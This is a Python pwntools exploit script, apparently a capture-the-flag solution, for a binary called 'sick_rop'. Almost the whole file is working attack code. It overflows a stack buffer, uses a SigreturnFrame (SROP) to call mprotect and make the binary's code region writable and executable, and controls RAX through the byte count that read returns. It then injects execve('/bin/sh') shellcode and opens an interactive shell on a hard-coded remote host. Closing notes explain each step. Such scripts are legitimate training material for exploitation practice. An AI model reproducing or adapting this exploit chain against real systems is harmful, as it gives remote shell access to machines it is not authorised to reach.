#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"
elf = ELF("./given/sick_rop")

def conn():
    if args.REMOTE:
        p = remote("68.183.35.199", 32220)
    else:
        p = process([elf.path])
        if args.D:
            gdb.attach(p, """
                    b *0x40104e # <vuln> ret
                    """)
    return p

def shellcode():
    """
    Intel Style
    """
    sc = """
        xor rdx, rdx;
        push rdx;
        pop rsi;
        push rdx;
        mov rdi, 0x68732f6e69622f2f;
        push rdi;
        push rsp;
        pop rdi;
        push 0x3b;
        pop rax;
        syscall;
    """
    return asm(sc)

def exploit():
    """
    Challenge: rare ROP gadget
    key insight:
        1) syscall return value to control %rax
        2) SROP to control the rest of the register

    """
    p = conn()

    # info from objdump
    rop_syscall = 0x401014
    rop_vuln = elf.symbols['vuln']
    call_read_with_stack = 0x40103e
    call_vuln = 0x40104f

    # pwndbg> search -p 0x40102e # the start of <vuln>
    ptr_vuln = 0x4010d8
    # pwndbg> search -p 0x40104f # call <vuln> in <_start>
    ptr_call_vuln = 0x4010f0

    # payload #0: setup SROP frame
    # NOTE: we return to vulns prologue so that the "call <vuln>" won't happen
    padding = b"a" * (0x20 + 8)
    srop = SigreturnFrame()
    srop.rax = constants.SYS_mprotect
    srop.rdi = 0x400000
    srop.rsi = 0x5000
    srop.rdx = constants.PROT_WRITE | constants.PROT_EXEC | constants.PROT_READ
    # syscall for mprotect
    srop.rip = rop_syscall
    # return to <vuln>
    srop.rsp = ptr_call_vuln
    #payload = padding + p64(elf.symbols['vuln']) + p64(rop_syscall) + bytes(srop)

    ################
    # step 1: ROP for SROP
    ##############
    # Since we want to call mprotect()
    payload = padding

    # call <vuln> again to change %RAX value: step 2 will do this
    payload += p64(rop_vuln)

    # the syscall for SYS_rt_sigreturn
    payload += p64(rop_syscall)

    # the srop frame, rsp & rip will be redirected by the frame
    payload += bytes(srop)
    p.send(payload)
    p.recv()

    ###############
    # step 2: change %rax
    ##############
    # payload #1: change rax based on return value
    payload = b"a" * constants.SYS_rt_sigreturn
    p.send(payload)
    p.recv()

    # Now the stack is from
    payload = padding + p64(ptr_call_vuln + 8) + shellcode()
    p.send(payload)
    p.interactive()



if __name__ == '__main__':
    exploit()


"""
NOTE:
This challenge is gold, which consists of some concept:
1) SROP should be the way to do it because
    a) ROP gadgets are rare
    b) we cannot leak stack address easily and data section of the elf is not writable

2) To SROP, we simply need to change RAX. However....
    There was no RAX gadget. The insight is that the SYS_read and SYS_write returns number of bytes read/written so we can control it

3) SROP frame:
    there are two tasks:
    A) first, we need to perform "SYS_mprotect", so the RIP is clearly a syscall gadget
    B) second, we need to inject shellcode, so we have to perform another SYS_read.
    C) third, we need to jump to the shellcode

    Task A) is easy, we need a SYSCALL ROP gadget.
    Task B) and C) means that we need to form ROP chain on the SROP stack.
    To do so, we search for "the pointer of the gadget" in the code

    pwndbg> search -p [0x40102e|0x40104f]
    (NOTE that jumping into <read> function in elf also works but the pointer
     of the gadget does not exists, Therefore, we choose <vuln> or call <Vuln>)

    Now, the SROP stack and the code are overlapped, we can benefit from this:
    a) we can get the stack address by "ptr of the gadget"
    b) because <vuln> uses the buffer on the stack, we can get the buffer address by calculating the offset.

    Just sigreturned
    rip: syscall # for mprotect
         ret                 | call <vuln>  |
                             ^ RSP = ptr_call_vuln
                            |
                            v
    rip: ret                 |              |
                             ^ptr_call_vuln ^ RSP
                            |
                            v
    Calling vuln, (before read)
        |----0x20----| sRBP  |     sRIP     |
        ^buf = RSP
                            |
                            v
    after read(): payload #2
        |------padding-------| <shellcode>  | shellcode body |
                             ^ptr_call_vuln ^<shellcode>

    Hence, <shellcode> == ptr_call_vuln + 8





